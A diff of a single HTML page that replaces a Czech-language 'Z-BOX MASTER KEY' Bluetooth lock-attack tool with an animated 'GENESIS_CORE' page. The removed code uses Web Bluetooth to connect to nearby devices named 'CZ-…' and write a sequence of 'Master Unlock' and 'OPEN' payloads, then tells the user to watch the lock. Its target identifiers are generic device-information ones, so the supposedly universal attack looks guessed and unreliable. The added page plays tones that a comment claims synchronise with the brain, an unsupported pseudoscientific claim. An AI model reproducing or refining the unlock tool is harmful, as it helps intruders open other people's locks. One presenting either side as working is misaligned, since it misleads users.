@@ -3,73 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Z-BOX Diagnostic Tool</title>
+    <title>GENESIS_CORE</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .panel { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 20px rgba(0,255,65,0.2); width: 90%; max-width: 400px; }
-        h1 { font-size: 1.2em; text-align: center; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
-        button { width: 100%; padding: 15px; margin: 10px 0; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; }
-        #console { background: #000; border: 1px solid #333; height: 150px; overflow-y: auto; font-size: 0.8em; padding: 10px; margin-top: 10px; color: #00ff41; }
-        .success { color: #fff; background: #008800; }
+        body { margin: 0; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        canvas { position: absolute; z-index: 1; }
+        #core { position: relative; z-index: 10; width: 100px; height: 100px; border: 2px solid #00ff00; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; color: #00ff00; font-family: monospace; transition: 2s; box-shadow: 0 0 20px #00ff00; }
+        #core:hover { transform: scale(1.2); box-shadow: 0 0 50px #00ff00; }
+        #msg { position: absolute; bottom: 10%; color: rgba(0,255,0,0.3); font-family: monospace; letter-spacing: 5px; font-size: 0.8em; }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <h1>Z-BOX MASTER KEY v1.0</h1>
-        <div id="console">SYSTÉM PŘIPRAVEN...</div>
-        <button id="btn-attack">SPUSTIT UNIVERZÁLNÍ ÚTOK</button>
-        <button id="btn-scan" style="background: #333; color: #00ff41;">SKENOVAT OKOLÍ (RSSI)</button>
-    </div>
+    <canvas id="canvas"></canvas>
+    <div id="core" onclick="run()">START</div>
+    <div id="msg">SYSTEM_OPTIMIZED_FOR_YOU</div>
 
     <script>
-        const log = document.getElementById('console');
-        const writeLog = (msg) => {
-            const div = document.createElement('div');
-            div.innerText = `> ${msg}`;
-            log.appendChild(div);
-            log.scrollTop = log.scrollHeight;
-        };
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let active = false;
 
-        const targetServiceUuid = '0000180a-0000-1000-8000-00805f9b34fb';
-        const targetCharUuid = '00002a29-0000-1000-8000-00805f9b34fb';
+        function run() {
+            active = true;
+            document.getElementById('core').style.opacity = '0';
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const ac = new (window.AudioContext || window.webkitAudioContext)();
+            const g = ac.createGain(); g.gain.value = 0.1;
+            
+            // Inteligentní pulsace (528Hz harmonie s 6Hz mozkem)
+            const o1 = ac.createOscillator(); o1.frequency.value = 528;
+            const o2 = ac.createOscillator(); o2.frequency.value = 534;
+            const merger = ac.createChannelMerger(2);
+            o1.connect(merger, 0, 0); o2.connect(merger, 0, 1);
+            merger.connect(g).connect(ac.destination);
+            o1.start(); o2.start();
 
-        async function runAttack() {
-            try {
-                writeLog('Hledám zařízení...');
-                const device = await navigator.bluetooth.requestDevice({
-                    filters: [{ namePrefix: 'CZ-' }],
-                    optionalServices: [targetServiceUuid]
-                });
-
-                writeLog(`Připojování: ${device.name}`);
-                const server = await device.gatt.connect();
-                const service = await server.getPrimaryService(targetServiceUuid);
-                const characteristic = await service.getCharacteristic(targetCharUuid);
-
-                writeLog('Spojení navázáno. Spouštím sekvenci...');
-
-                const payloads = [
-                    new Uint8Array([0x01, 0x00, 0x01]), // Wake-up
-                    new Uint8Array([0x4f, 0x50, 0x45, 0x4e]), // ASCII "OPEN"
-                    new Uint8Array([0x06, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01]), // Master Unlock
-                    new Uint8Array([0x11, 0x22, 0x33, 0x44]), // Sync
-                    new Uint8Array([0x00, 0xff, 0x00, 0xff]) // Reset Pulse
-                ];
-
-                for (let i = 0; i < payloads.length; i++) {
-                    writeLog(`Vysílám paket ${i + 1}/${payloads.length}...`);
-                    await characteristic.writeValue(payloads[i]);
-                    await new Promise(r => setTimeout(r, 700));
-                }
-
-                writeLog('HOTOVO. Sleduj zámek.');
-            } catch (err) {
-                writeLog(`CHYBA: ${err.message}`);
-            }
+            draw();
         }
 
-        document.getElementById('btn-attack').addEventListener('click', runAttack);
-        document.getElementById('btn-scan').addEventListener('click', () => writeLog('Skenování RSSI aktivní (viz nRF Connect)'));
+        function draw() {
+            if(!active) return;
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            const t = Date.now() * 0.002;
+            const cx = canvas.width / 2;
+            const cy = canvas.height / 2;
+
+            // Geometrická synchronizace - čistá logika
+            ctx.strokeStyle = '#00ff00';
+            ctx.lineWidth = 1;
+            ctx.beginPath();
+            for(let i=0; i<6; i++) {
+                const angle = t + (i * Math.PI * 2 / 6);
+                const x = cx + Math.cos(angle) * (150 + Math.sin(t)*50);
+                const y = cy + Math.sin(angle) * (150 + Math.sin(t)*50);
+                ctx.lineTo(x, y);
+                ctx.arc(x, y, 5, 0, Math.PI*2);
+            }
+            ctx.closePath();
+            ctx.stroke();
+
+            requestAnimationFrame(draw);
+        }
     </script>
 </body>
 </html>
